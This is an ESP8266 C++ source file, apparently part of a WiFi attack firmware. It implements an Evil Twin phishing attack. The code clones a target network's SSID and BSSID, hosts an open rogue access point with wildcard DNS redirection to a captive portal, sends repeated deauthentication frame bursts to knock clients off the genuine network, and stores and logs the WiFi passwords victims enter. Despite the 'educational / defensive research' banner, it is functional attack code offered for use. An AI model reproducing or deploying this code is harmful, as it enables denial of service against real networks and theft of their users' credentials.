/*
 * evil_twin.cpp — Evil Twin WiFi phishing with captive portal
 *
 * ================================================================
 *  ⚠ EDUCATIONAL / DEFENSIVE RESEARCH USE ONLY
 *  Created by: Shawal Ahmad Mohmand
 * ================================================================
 */

#include "evil_twin.h"
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include "settings.h"
extern "C" {
  #include "user_interface.h"
}

static bool _running = false;
static char _cloneSSID[33];
static uint8_t _cloneChannel = 1;
static uint8_t _cloneBSSID[6];
static uint32_t _deauthCount = 0;
static unsigned long _lastDeauth = 0;

static CapturedCred _creds[MAX_CAPTURED_CREDS];
static uint8_t _credCount = 0;

static DNSServer* _dns = nullptr;

// Deauth frame for background deauthing original AP
static uint8_t _etDeauth[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x01, 0x00 // Reason code: Unspecified
};

// ── Background deauth sender ────────────────────────────────────
static void _sendDeauthBurst() {
  // We stay in WIFI_AP_STA mode, so we don't need to switch opmodes!
  // Just temporarily change channel if needed, however since we cloned the AP, 
  // we should already be on the target channel!
  for (int i = 0; i < 20; i++) {
    _etDeauth[22] = (_deauthCount & 0xFF);
    _etDeauth[23] = ((_deauthCount >> 8) & 0x0F);
    wifi_send_pkt_freedom(_etDeauth, sizeof(_etDeauth), 0);
    _deauthCount++;
    delayMicroseconds(200);
  }
}

// ── Public API ──────────────────────────────────────────────────

void evil_twin_start(const char* targetSSID, uint8_t targetChannel, const uint8_t targetBSSID[6]) {
  strncpy(_cloneSSID, targetSSID, 32);
  _cloneSSID[32] = '\0';
  _cloneChannel = targetChannel;
  memcpy(_cloneBSSID, targetBSSID, 6);
  _credCount = 0;
  _deauthCount = 0;
  _lastDeauth = 0;

  // Setup deauth frame for target
  memcpy(&_etDeauth[10], _cloneBSSID, 6);
  memcpy(&_etDeauth[16], _cloneBSSID, 6);
  memset(&_etDeauth[4], 0xFF, 6);

  // We are already in WIFI_AP_STA mode.
  // We override the SoftAP settings with the clone
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP(_cloneSSID, "", _cloneChannel);

  // Start DNS — redirect everything to us
  if (_dns) delete _dns;
  _dns = new DNSServer();
  _dns->setErrorReplyCode(DNSReplyCode::NoError);
  _dns->start(DNS_PORT, "*", IPAddress(192,168,4,1));

  _running = true;
  DBGF("[ET] Evil twin started: SSID=%s ch=%d\n", _cloneSSID, _cloneChannel);
}

void evil_twin_stop() {
  _running = false;
  if (_dns) { _dns->stop(); delete _dns; _dns = nullptr; }
  
  // Restore original AP settings
  if (globalSettings.ap_on) {
    WiFi.softAP(globalSettings.ap_ssid, globalSettings.ap_pass, globalSettings.ap_channel);
  } else {
    WiFi.softAPdisconnect(true);
  }
  
  DBGLN(F("[ET] Evil twin stopped"));
}

void evil_twin_update() {
  if (!_running) return;

  if (_dns) _dns->processNextRequest();

  // Send deauth bursts periodically to kick clients off real AP
  unsigned long now = millis();
  if (now - _lastDeauth > 3000) {  // Every 3 seconds
    _lastDeauth = now;
    _sendDeauthBurst();
  }
}

bool evil_twin_isRunning() {
  return _running;
}

uint8_t evil_twin_getCredCount() {
  return _credCount;
}

CapturedCred* evil_twin_getCreds() {
  return _creds;
}

uint32_t evil_twin_getDeauthCount() {
  return _deauthCount;
}

String evil_twin_getIP() {
  return WiFi.softAPIP().toString();
}

void evil_twin_submitCred(const char* password) {
  if (_credCount < MAX_CAPTURED_CREDS && strlen(password) > 0) {
    strncpy(_creds[_credCount].ssid, _cloneSSID, 32);
    _creds[_credCount].ssid[32] = '\0';
    strncpy(_creds[_credCount].password, password, 64);
    _creds[_credCount].password[64] = '\0';
    _creds[_credCount].timestamp = millis() / 1000;
    _credCount++;
    DBGF("[ET] Password captured: %s\n", password);
  }
}

const char* evil_twin_getCloneSSID() {
  return _cloneSSID;
}
